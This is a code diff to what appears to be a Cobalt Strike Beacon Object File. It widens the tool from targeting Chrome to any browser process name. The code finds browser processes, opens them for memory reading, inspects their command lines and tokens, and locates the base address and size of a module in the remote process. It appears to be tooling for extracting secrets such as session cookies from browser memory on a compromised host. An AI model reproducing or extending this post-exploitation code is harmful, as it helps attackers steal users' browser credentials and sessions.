@@ -209,7 +209,7 @@ extern "C" {
         return nullptr;
     }
 
-    void FindAllSuitableProcesses()
+    void FindAllSuitableProcesses(LPCWSTR processName)
     {
         HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
         if (hProcessSnap == INVALID_HANDLE_VALUE)
@@ -234,7 +234,7 @@ extern "C" {
 
         do
         {
-            if (wcscmp(pe32.szExeFile, L"chrome.exe") == 0)
+            if (wcscmp(pe32.szExeFile, processName) == 0)
             {
                 PEB peb = { 0 };
                 HANDLE hHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
@@ -245,7 +245,7 @@ extern "C" {
                     {
                         if (CustomWcsStr(commandLine, flags) != 0)
                         {
-                            BeaconPrintf(CALLBACK_OUTPUT, "[+] Found Chrome process: %d\n", pe32.th32ProcessID);
+                            BeaconPrintf(CALLBACK_OUTPUT, "[+] Found browser process: %d\n", pe32.th32ProcessID);
                             GetTokenUser(hHandle);
                         }
                     }
@@ -259,7 +259,7 @@ extern "C" {
         return;
     }
 
-    BOOL FindCorrectChromePID(DWORD* pid, HANDLE* hProcess)
+    BOOL FindCorrectProcessPID(LPCWSTR processName, DWORD* pid, HANDLE* hProcess)
     {
         HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
         if (hProcessSnap == INVALID_HANDLE_VALUE)
@@ -283,7 +283,7 @@ extern "C" {
 
         do
         {
-            if (wcscmp(pe32.szExeFile, L"chrome.exe") == 0)
+            if (wcscmp(pe32.szExeFile, processName) == 0)
             {
                 PEB peb = { 0 };
                 HANDLE hHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
@@ -294,7 +294,7 @@ extern "C" {
                     {
                         if (CustomWcsStr(commandLine, flags) != 0)
                         {
-                            BeaconPrintf(CALLBACK_OUTPUT, "[+] Found Chrome process: %d\n", pe32.th32ProcessID);
+                            BeaconPrintf(CALLBACK_OUTPUT, "[+] Found browser process: %d\n", pe32.th32ProcessID);
                             GetTokenUser(hHandle);
 
                             *pid = pe32.th32ProcessID;
@@ -315,7 +315,7 @@ extern "C" {
         return FALSE;
     }
 
-    BOOL GetRemoteModuleBaseAddress(HANDLE hProcess, const wchar_t* moduleName, uintptr_t& baseAddress) {
+    BOOL GetRemoteModuleBaseAddress(HANDLE hProcess, const wchar_t* moduleName, uintptr_t& baseAddress, DWORD* moduleSize) {
 
         HMODULE hModules[256]; //256 seems to be safe maximum in a BOF file (When initialized like so)
         DWORD cbNeeded;
@@ -324,6 +324,7 @@ extern "C" {
             BeaconPrintf(CALLBACK_ERROR, "K32EnumProcessModulesEx failed! Error: %i\n", GetLastError());
             return FALSE;
         }
+
         for (int i = 0; i < (cbNeeded / sizeof(HMODULE)); ++i) {
             wchar_t szModuleName[MAX_PATH];
             if (!K32GetModuleBaseNameW(hProcess, hModules[i], szModuleName, sizeof(szModuleName) / sizeof(wchar_t))) {
@@ -334,6 +335,7 @@ extern "C" {
                 MODULEINFO moduleInfo;
                 if (K32GetModuleInformation(hProcess, hModules[i], &moduleInfo, sizeof(moduleInfo))) {
                     baseAddress = reinterpret_cast<uintptr_t>(moduleInfo.lpBaseOfDll);
+                    *moduleSize = moduleInfo.SizeOfImage;
                     return TRUE;
                 }
                 else
